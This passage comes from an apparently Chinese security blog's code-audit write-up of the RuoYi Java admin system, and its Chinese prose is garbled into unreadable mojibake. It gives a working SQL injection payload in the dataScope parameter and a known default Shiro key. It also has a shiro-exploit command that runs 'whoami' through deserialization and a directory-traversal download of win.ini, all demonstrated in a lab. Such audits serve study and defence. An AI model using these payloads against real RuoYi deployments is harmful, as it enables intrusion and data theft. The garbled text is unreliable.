è¿›å…¥è¯¥æ–¹æ³•çˆ¶ç±»&#x2F;æ¥å£å®šä¹‰çš„ä½ç½® Service å±‚çš„æ¥å£ <code>ISysRoleService.java</code> <strong>ï¼ˆè¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥é¼ æ ‡å³é”®æ–¹æ³•åæ‰¾åˆ°å…¶è°ƒç”¨é“¾ç›´æ¥å®šä½åˆ° controller å±‚æ¥å£ï¼‰</strong></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129133452563.png" data-caption="image-20221129133452563"><img src="/../images/Java/ruoyi/image-20221129133452563.png" alt="image-20221129133452563"></a></p><p>æœ€å <code>Ctrl + é¼ æ ‡å·¦é”®</code> ï¼Œå®šä½åˆ°å…·ä½“çš„å®ç°ä»£ç ,ç”±ä¸‹å›¾å¯çŸ¥ï¼Œ59è¡Œã€69è¡Œå‡æœ‰è°ƒç”¨è¯¥å‡½æ•°</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129133753389.png" data-caption="image-20221129133753389"><img src="/../images/Java/ruoyi/image-20221129133753389.png" alt="image-20221129133753389"></a></p><p>é€šè¿‡ä»£ç å®šä½åˆ° <code>Controller</code> å±‚çš„ <code>SysRoleController.java</code> ç¬¬59è¡Œ ,è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€ç»ˆéœ€è¦å®¡è®¡çš„ä»£ç ï¼Œ&#x2F;list æœ‰ä¸¤ä¸ªå‚æ•°ï¼ŒSysRole å’Œ role ï¼Œæœ€ç»ˆ return ä¸º list ï¼Œè€Œ <code>List&lt;SysRole&gt; list = roleService.selectRoleList(role);</code>,æ‰€ä»¥å‚æ•°å€¼ä¸º <code>SysRole</code> å‚æ•°å®šä¹‰çš„å®ä½“ç±»</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129142906434.png" data-caption="image-20221129142906434"><img src="/../images/Java/ruoyi/image-20221129142906434.png" alt="image-20221129142906434"></a></p><p><code>Ctrl + é¼ æ ‡å·¦é”®</code> è·Ÿè¿› <code>SysRole</code> å‚æ•°ï¼Œå…·ä½“å®ä½“ç±»å¦‚ä¸‹ï¼Œå…·ä½“å‚æ•°å€¼ä¸ºï¼š<code>roleId=&amp;roleName=&amp;roleKey=&amp;roleSort=&amp;dataScope=&amp;status=&amp;delFlag=&amp;flag=&amp;menuIds=&amp;deptIds=</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129135057213.png" data-caption="image-20221129135057213"><img src="/../images/Java/ruoyi/image-20221129135057213.png" alt="image-20221129135057213"></a></p><p><code>dataScope</code> å‚æ•°æ²¡æœ‰è¿‡æ»¤ç›´æ¥è¿”å›</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129144458616.png" data-caption="image-20221129144458616"><img src="/../images/Java/ruoyi/image-20221129144458616.png" alt="image-20221129144458616"></a>    </p><p>å°è¯•æ¼æ´å¤ç°ï¼Œå®šä½è·¯ç”±ä»ä¸Šåˆ°ä¸‹ <code>/system/role/list</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129142133925.png" data-caption="image-20221129142133925"><img src="/../images/Java/ruoyi/image-20221129142133925.png" alt="image-20221129142133925"></a></p><p>ä¸”é€šè¿‡æ³¨è§£å¯çŸ¥é“ &#x2F;list ä¸º POST è¯·æ±‚æ–¹å¼</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129141948518.png" data-caption="image-20221129141948518"><img src="/../images/Java/ruoyi/image-20221129141948518.png" alt="image-20221129141948518"></a></p><p>ç›´æ¥åå°æµè§ˆï¼Œæ‰¾åˆ° <code>/system/role/list</code> è·¯å¾„</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129150602128.png" data-caption="image-20221129150602128"><img src="/../images/Java/ruoyi/image-20221129150602128.png" alt="image-20221129150602128"></a></p><p>æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œæ˜¯æ²¡æœ‰ <code>dataScope</code> å‚æ•°çš„ï¼Œæˆ‘ä»¬è‡ªå·±åŠ ä¸Šå³å¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129181626999.png" data-caption="image-20221129181626999"><img src="/../images/Java/ruoyi/image-20221129181626999.png" alt="image-20221129181626999"></a></p><p>æ¼æ´ payload: <code>pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params[beginTime]=&amp;params[endTime]=&amp;params[dataScope]=and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523</code></p><p>æ·»åŠ å‚æ•°åï¼Œéšä¾¿è¾“å…¥å­—ç¬¦è¿”å›æŠ¥é”™</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129182031431.png" data-caption="image-20221129182031431"><img src="/../images/Java/ruoyi/image-20221129182031431.png" alt="image-20221129182031431"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129181939916.png" data-caption="image-20221129181939916"><img src="/../images/Java/ruoyi/image-20221129181939916.png" alt="image-20221129181939916"></a></p><p>æˆåŠŸæŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯ï¼Œè¯æ˜å­˜åœ¨SQLæ³¨å…¥</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129182436018.png" data-caption="image-20221129182436018"><img src="/../images/Java/ruoyi/image-20221129182436018.png" alt="image-20221129182436018"></a></p><p>å¯ç›´æ¥å‘åŒ…åˆ° sqlmap è·‘æ•°æ® </p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129182906151.png" data-caption="image-20221129182906151"><img src="/../images/Java/ruoyi/image-20221129182906151.png" alt="image-20221129182906151"></a></p><p>è‡³æ­¤ï¼Œ<code>selectRolelist</code> æ¥å£çš„SQLæ³¨å…¥å®¡è®¡å°±ç»“æŸäº†ï¼Œæ•´ä¸ªå®¡è®¡æµç¨‹ä¸º <code>SysRoleMapper.xml -ã€‹SysRoleMapper.jave -ã€‹SysRoleServiceImpI.java -ã€‹ISysRoleService.java -ã€‹SysRoleController.java -ã€‹SysRole.java</code></p><p>ç®€å•æ¦‚å†µå°±æ˜¯ ${ å®šä½æ¼æ´ç‚¹ -ã€‹resource ç›®å½•ä¸‹çš„ Mybatis æ˜ å°„è¯­å¥é…ç½®æ–‡ä»¶ -ã€‹é€šè¿‡æ˜ å°„è¯­å¥å®šä½ Service å±‚çš„å®ä½“ç±»æ¥å£ -ã€‹å†å®šä½åˆ° Service å±‚çš„æ¥å£æ–‡ä»¶ -ã€‹é€šè¿‡æ¥å£å®šä½åˆ° Controller å±‚æœ€ç»ˆè°ƒç”¨æ¥å£ -ã€‹æœ€åå®šä½åˆ°æ¥å£çš„å…·ä½“å®ç°ä»£ç  -ã€‹åˆ†æå‚æ•°æ˜¯å¦æœ‰è¿‡æ»¤</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230220220920253.png" data-caption="image-20230220220920253"><img src="/../images/Java/ruoyi/image-20230220220920253.png" alt="image-20230220220920253"></a></p><p>æˆ‘ä»¬äº¦å¯ä»¥é€šè¿‡å¯¹æ¯”å®˜æ–¹æ›´æ–°æ–‡ä»¶æ‰¾åˆ°æ¼æ´ç‚¹è¿›è¡Œå®¡è®¡</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216125250617.png" data-caption="image-20230216125250617"><img src="/../images/Java/ruoyi/image-20230216125250617.png" alt="image-20230216125250617"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216125414063.png" data-caption="image-20230216125414063"><img src="/../images/Java/ruoyi/image-20230216125414063.png" alt="image-20230216125414063"></a></p><p>ä¿®æ”¹å‰</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216130127701.png" data-caption="image-20230216130127701"><img src="/../images/Java/ruoyi/image-20230216130127701.png" alt="image-20230216130127701"></a></p><p>ä¿®æ”¹å</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216130102638.png" data-caption="image-20230216130102638"><img src="/../images/Java/ruoyi/image-20230216130102638.png" alt="image-20230216130102638"></a></p><br/><h4 id="Shiroç»„ä»¶æ¼æ´"><a href="#Shiroç»„ä»¶æ¼æ´" class="headerlink" title="Shiroç»„ä»¶æ¼æ´"></a>Shiroç»„ä»¶æ¼æ´</h4><p>è‹¥ä¾ç³»ç»Ÿä½¿ç”¨äº† Shiro ï¼Œæˆ‘ä»¬çŸ¥é“ Shiro &lt; 1.2.4 å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œ Shiro 1.4.2 åˆ° 1.8.0 å­˜åœ¨æƒé™ç»•è¿‡æ¼æ´ï¼Œæœ¬é¡¹ç›®ä½¿ç”¨çš„ Shiro ç‰ˆæœ¬ä¸º 1.7.0ã€‚</p><p><strong>1ï¼‰Shiro ååºåˆ—åŒ–</strong></p><p>è¿™é‡Œé€šè¿‡ Burp æ’ä»¶æ‰¾åˆ°äº† Shiro é»˜è®¤å¯†é’¥ <code>zSyK5Kp6PZAAjlT+eeNMlg==</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200200219.png" data-caption="image-20221129200200219"><img src="/../images/Java/ruoyi/image-20221129200200219.png" alt="image-20221129200200219"></a></p><p>è¿™è¾¹ä½¿ç”¨ <a href="https://github.com/Ares-X/shiro-exploit">Github</a> ä¸Šå·¥å…·è¿›è¡Œäº†å¤ç°ï¼Œç¬¬ä¸€æ¬¡å°è¯•å¹¶æ²¡æˆåŠŸï¼Œåé¢æ¢äº†ä¸€ä¸ªå·¥å…·ï¼Œå‘ç°åˆå¯ä»¥äº†ï¼Œæ‰€ä»¥å¹³å¸¸åœ¨å®æˆ˜ä¸­é‡åˆ° Shiro Key æ³„éœ²çš„æƒ…å†µï¼Œå¤šæ¢å‡ ä¸ªå·¥å…·å°è¯•ä¸€ä¸‹ï¼Œæ²¡å‡†ä¼šæœ‰æ”¶è·</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200510839.png" data-caption="image-20221129200510839"><img src="/../images/Java/ruoyi/image-20221129200510839.png" alt="image-20221129200510839"></a></p><p>è¿›è¡Œå‘½ä»¤æ‰§è¡Œ <code>python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u http://192.168.114.160:8888/ -v 2 -k zSyK5Kp6PZAAjlT+eeNMlg== -c whoami</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200614230.png" data-caption="image-20221129200614230"><img src="/../images/Java/ruoyi/image-20221129200614230.png" alt="image-20221129200614230"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200636926.png" data-caption="image-20221129200636926"><img src="/../images/Java/ruoyi/image-20221129200636926.png" alt="image-20221129200636926"></a></p><p><strong>æ¼æ´å®¡è®¡ï¼š</strong></p><p>Shiro AES ç§˜é’¥åœ¨ 1.2.4 ç‰ˆæœ¬åŠä¹‹å‰ç‰ˆæœ¬æ˜¯å­˜åœ¨å¯†é’¥ç¡¬ç¼–ç çš„ï¼Œ1.2.5 ç‰ˆæœ¬ä»¥å Shiro æä¾›äº† AES å¯†é’¥çš„éšæœºç”Ÿæˆä»£ç ï¼Œä½†å¦‚æœä»…è¿›è¡Œ Shiro ç‰ˆæœ¬å‡çº§ï¼ŒAES å¯†é’¥ä»ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ï¼Œä»ç„¶ä¼šå­˜åœ¨ååºåˆ—åŒ–é£é™©ã€‚åœ¨å®¡è®¡ä¸­æˆ‘ä»¬å¯ä»¥å…¨å±€æœç´¢ <code>setCipherKey</code> ,è¯¥æ–¹æ³•æ˜¯ç”¨äºä¿®æ”¹å¯†é’¥çš„ï¼Œè‹¥å­˜åœ¨ <code>setCipherKey</code> æ–¹æ³•åˆ™è¯´æ˜å­˜åœ¨é»˜è®¤keyï¼Œè¿›ä¸€æ­¥æœç´¢ <code>cipherKey</code> å¯æŸ¥çœ‹å…·ä½“å¯†é’¥å€¼</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129210227296.png" data-caption="image-20221129210227296"><img src="/../images/Java/ruoyi/image-20221129210227296.png" alt="image-20221129210227296"></a></p><p>å¯†é’¥ç¡¬ç¼–ç åœ¨ <code>application.yml</code> æ–‡ä»¶å¤„</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129210304172.png" data-caption="image-20221129210304172"><img src="/../images/Java/ruoyi/image-20221129210304172.png" alt="image-20221129210304172"></a></p><p><strong>2ï¼‰Shiro æƒé™ç»•è¿‡å®¡è®¡</strong></p><p>æ­¤æ¼æ´ä¹Ÿåªéœ€è¦å®¡è®¡ <code>ShiroConfig.java</code> é…ç½®æ–‡ä»¶é‡Œé¢çš„è¿‡æ»¤å™¨æœ‰æ²¡æœ‰å¯¹ç›®å½•è¿›è¡Œé™åˆ¶ã€‚ç”±ä¸Šä¸€ç¯‡ç³»åˆ—æ–‡ç« æˆ‘ä»¬çŸ¥é“ <code>anon</code> ä¸ºåŒ¿åæ‹¦æˆªå™¨ï¼Œä¸éœ€è¦ç™»å½•å°±èƒ½è®¿é—®ï¼Œä¸€èˆ¬ç”¨äºé™æ€èµ„æº,æˆ–è€…ç§»åŠ¨ç«¯æ¥å£ï¼›<code>authc</code> ä¸ºç™»å½•æ‹¦æˆªå™¨ï¼Œéœ€è¦ç™»å½•è®¤è¯æ‰èƒ½è®¿é—®çš„èµ„æºï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶é…ç½®éœ€è¦ç™»å½•çš„ URL è·¯å¾„</p><p>authc æ‹¦æˆªå™¨åŒ¹é…è§„åˆ™å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| é€šé…ç¬¦ | è¯´æ˜                    |</span><br><span class="line">| ------ | ----------------------- |</span><br><span class="line">| ï¼Ÿ     | åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦        |</span><br><span class="line">| *      | åŒ¹é…ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬0ä¸ª   |</span><br><span class="line">| **     | åŒ¹é…ä»»æ„å±‚è·¯å¾„ï¼ŒåŒ…æ‹¬0ä¸ª |</span><br></pre></td></tr></table></figure></div><p>ä»¥ä¸‹é™æ€èµ„æºè¿›è¡ŒåŒ¿åç™»å½•ï¼Œä¸éœ€è¦è®¤è¯å³å¯è®¿é—®</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129212610780.png" data-caption="image-20221129212610780"><img src="/../images/Java/ruoyi/image-20221129212610780.png" alt="image-20221129212610780"></a></p><p>å¯¹éœ€è¦è®¤è¯çš„é¡µé¢è¿›è¡Œäº† <code>/**</code> é™åˆ¶ï¼Œéœ€è¦ç™»å½•è®¤è¯æ‰èƒ½è®¿é—®</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129212641545.png" data-caption="image-20221129212641545"><img src="/../images/Java/ruoyi/image-20221129212641545.png" alt="image-20221129212641545"></a></p><h4 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h4><p>è‹¥ä¾ç³»ç»Ÿä»»æ„è¯»å–æ–‡ä»¶å½±å“ç‰ˆæœ¬ä¸º <code>RuoYi &lt; v4.5.1</code> ï¼Œæœ¬ç¯å¢ƒä¸º <code>4.6.0</code>ï¼Œè¿™è¾¹é‡æ–°éƒ¨ç½²äº†<a href="https://gitee.com/y_project/RuoYi/repository/archive/v4.5.0.zip">v4.5.0</a> çš„ç¯å¢ƒï¼Œå­¦ä¹ è¯¥æ¼æ´ï¼Œéƒ¨ç½²æ–¹æ³•å¦‚ä¸Šã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221130134353409.png" data-caption="image-20221130134353409"><img src="/../images/Java/ruoyi/image-20221130134353409.png" alt="image-20221130134353409"></a></p><p>é€šè¿‡å¯¹æ¯” V4.5.0 ä¸ V4.5.1 çš„ä»£ç åˆ†æå®šä½æ¼æ´ç‚¹</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215406546.png" data-caption="image-20230206215406546"><img src="/../images/Java/ruoyi/image-20230206215406546.png" alt="image-20230206215406546"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215514857.png" data-caption="image-20230206215514857"><img src="/../images/Java/ruoyi/image-20230206215514857.png" alt="image-20230206215514857"></a></p><p>V4.5.0 æ¼æ´æœªä¿®å¤å‰æºç </p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215622205.png" data-caption="image-20230206215622205"><img src="/../images/Java/ruoyi/image-20230206215622205.png" alt="image-20230206215622205"></a></p><p>V4.5.1æ¼æ´ä¿®å¤åæ›´æ–°åçš„ä»£ç </p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215726171.png" data-caption="image-20230206215726171"><img src="/../images/Java/ruoyi/image-20230206215726171.png" alt="image-20230206215726171"></a></p><p>æ ¹æ®å®˜æ–¹ä»£ç å¯çŸ¥æ¼æ´ä½ç½®ä¸º</p><p> <code>ruoyi-admin/src/main/java/com/ruoyi/web/controller/common/CommonController.java</code> </p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207211853841.png" data-caption="image-20230207211853841"><img src="/../images/Java/ruoyi/image-20230207211853841.png" alt="image-20230207211853841"></a></p><p>ç”±ä»£ç å¯çŸ¥ï¼Œåœ¨ä¸‹è½½èµ„æºæ—¶æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ï¼Œå¯ç›´æ¥ä¸‹è½½æœ¬åœ°èµ„æº</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æœ¬åœ°èµ„æºé€šç”¨ä¸‹è½½</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/common/download/resource&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resourceDownload</span><span class="params">(String resource, HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// æœ¬åœ°èµ„æºè·¯å¾„</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">localPath</span> <span class="operator">=</span> Global.getProfile();</span><br><span class="line">    <span class="comment">// æ•°æ®åº“èµ„æºåœ°å€</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadPath</span> <span class="operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</span><br><span class="line">    <span class="comment">// ä¸‹è½½åç§°</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadName</span> <span class="operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);</span><br><span class="line">    FileUtils.setAttachmentResponseHeader(response, downloadName);</span><br><span class="line"></span><br><span class="line">    FileUtils.writeBytes(downloadPath, response.getOutputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>å®¡è®¡åˆæ­¥è¯·æ±‚è·¯å¾„ä¸º <code>/common/download/resource?resource=</code>ï¼Œä½¿ç”¨çš„æ–¹æ³•ä¸º GETï¼ˆå› ä¸ºä½¿ç”¨çš„æ³¨è§£æ˜¯ @GetMappingï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214447968.png" data-caption="image-20230207214447968"><img src="/../images/Java/ruoyi/image-20230207214447968.png" alt="image-20230207214447968"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207221539853.png" data-caption="image-20230207221539853"><img src="/../images/Java/ruoyi/image-20230207221539853.png" alt="image-20230207221539853"></a></p><p>æœ¬åœ°èµ„æºè·¯å¾„ä¸ºå¼€å§‹æ—¶æˆ‘ä»¬è®¾ç½®çš„ <code>uploadPath</code> è·¯å¾„ï¼Œè¿™æ®µä»£ç ä¸‹è½½çš„æ–‡ä»¶å°±æ˜¯è¿™ä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214512267.png" data-caption="image-20230207214512267"><img src="/../images/Java/ruoyi/image-20230207214512267.png" alt="image-20230207214512267"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214258149.png" data-caption="image-20230207214258149"><img src="/../images/Java/ruoyi/image-20230207214258149.png" alt="image-20230207214258149"></a></p><p>åˆ†æä»£ç  <code>String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</code>ï¼Œå…¶ä¸­ <code>localPath</code> ä¸ºæœ¬åœ°èµ„æºè·¯å¾„ + <code>StringUtils.substringAfter()</code> æ–¹æ³•ï¼Œå…¶ä¸­æ–¹æ³•ä¸­å®šä¹‰äº†è¯·æ±‚å‚æ•°ä¸º <code>resource</code>  å’Œè¯·æ±‚å‰ç¼€ <code>Constants.RESOURCE_PREFIX</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214603424.png" data-caption="image-20230207214603424"><img src="/../images/Java/ruoyi/image-20230207214603424.png" alt="image-20230207214603424"></a></p><p>æˆ‘ä»¬è·Ÿè¿› <code>Constants.RESOURCE_PREFIX</code>  <code> Ctrl + é¼ æ ‡å·¦é”®</code>  æŸ¥çœ‹æ–‡ä»¶ä¸‹è½½èµ„æºæ—¶çš„è¯·æ±‚å‰ç¼€æ˜¯ä»€ä¹ˆï¼Œç”±ä¸‹å›¾å¯çŸ¥ï¼Œè¯·æ±‚ä¸‹è½½å‰çš„èµ„æºå‰ç¼€ä¸º <code>/profile</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207215525136.png" data-caption="image-20230207215525136"><img src="/../images/Java/ruoyi/image-20230207215525136.png" alt="image-20230207215525136"></a></p><p><code>downloadName = StringUtils.substringAfterLast(downloadPath, &quot;/&quot;);</code> å³ä¸‹è½½åç§°ä¸ºå…ˆæ‰§è¡Œ <code>downloadPath</code> æ–¹æ³•ï¼Œå†ç”¨ <code>separator&quot;/&quot;</code>(åˆ†éš”ç¬¦+ä¸‹è½½æ–‡ä»¶çš„åç§°)</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207220732139.png" data-caption="image-20230207220732139"><img src="/../images/Java/ruoyi/image-20230207220732139.png" alt="image-20230207220732139"></a></p><p>æ•´åˆä¸Šé¢åˆ†æçš„ï¼Œå¾—åˆ°æ•´ä½“è·¯ç”±ä¸ºï¼š<code>/common/download/resource?resource=/profile/ä¸‹è½½æ–‡ä»¶çš„åç§°</code>,ä½¿ç”¨æ–¹æ³•ä¸ºGET</p><p>æ¼æ´å¤ç°</p><p>1ã€æˆ‘ä»¬ç°åœ¨ <code>localPath</code> å³ <code>C:/Tools/enviroment/RuoYi-v4.5.0/ruoyi/uploadPath</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç”¨äºæµ‹è¯•</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207221912564.png" data-caption="image-20230207221912564"><img src="/../images/Java/ruoyi/image-20230207221912564.png" alt="image-20230207221912564"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207222514373.png" data-caption="image-20230207222514373"><img src="/../images/Java/ruoyi/image-20230207222514373.png" alt="image-20230207222514373"></a></p><p>2ã€æ„é€ è¯·æ±‚è¿æ¥ä¸º <code>/common/download/resource?resource=/profile/flag.txt</code>ï¼Œéœ€åœ¨åå°è®¿é—®</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207222626156.png" data-caption="image-20230207222626156"><img src="/../images/Java/ruoyi/image-20230207222626156.png" alt="image-20230207222626156"></a></p><p>3ã€ç”±äºä»£ç æ²¡æœ‰å¯¹ä¸‹è½½çš„è·¯å¾„è¿›è¡Œé™åˆ¶ï¼Œæˆ‘ä»¬å°è¯•åˆ©ç”¨ç›®å½•ç©¿è¶Šä»»æ„ä¸‹è½½ç³»ç»Ÿæ–‡ä»¶ <code>windows/win.ini</code>ï¼Œç”±ä¸‹å›¾å¯çŸ¥ï¼Œæˆ‘ä»¬åˆ°è¾¾ Cç›˜ä¸‹çš„ <code>windows/win.ini</code> æœ‰å…­å±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…­ä¸ª ..&#x2F; è¿›è¡Œç›®å½•ç©¿è¶Š</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207222906262.png" data-caption="image-20230207222906262"><img src="/../images/Java/ruoyi/image-20230207222906262.png" alt="image-20230207222906262"></a></p><p>æˆåŠŸåˆ©ç”¨ç›®å½•ç©¿è¶Šæ¼æ´å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207223141156.png" data-caption="image-20230207223141156"><img src="/../images/Java/ruoyi/image-20230207223141156.png" alt="image-20230207223141156"></a></p><h2 id="å››ã€å‚è€ƒ"><a href="#å››ã€å‚è€ƒ" class="headerlink" title="å››ã€å‚è€ƒ"></a>å››ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_44029310/article/details/125296406</span><br><span class="line">https://gitee.com/y_project/RuoYi/releases</span><br><span class="line">https://power7089.github.io/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%8C%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1%E4%B8%8D%E5%BE%97%E4%B8%8D%E5%A5%BD%E5%A5%BD%E5%AD%A6%E7%9A%84%E4%B8%80%E4%B8%AA%E7%B3%BB%E7%BB%9F/    </span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
            <tag> Shiroååºåˆ—åŒ– </tag>
            
            <tag> ä»»æ„æ–‡ä»¶è¯»å– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€ç³»åˆ—-å§”æ´¾æ”»å‡»(éçº¦æŸæ€§å§”æ´¾/çº¦æŸæ€§å§”æ´¾)</title>
      <link href="/2023/01/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" 